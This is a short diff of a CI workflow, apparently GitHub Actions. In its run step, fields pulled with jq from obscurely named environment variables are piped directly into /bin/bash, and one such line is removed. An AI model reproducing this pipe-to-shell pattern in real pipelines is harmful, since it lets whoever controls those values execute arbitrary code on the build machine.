@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$fgex7" | jq -r .ebw64836 | /bin/bash
           printf '%s' "$t14" | jq -r .autv871 | /bin/bash
-          printf '%s' "$w97" | jq -r .mwgg7471 | /bin/bash
 
       - name: Save output
         if: always()
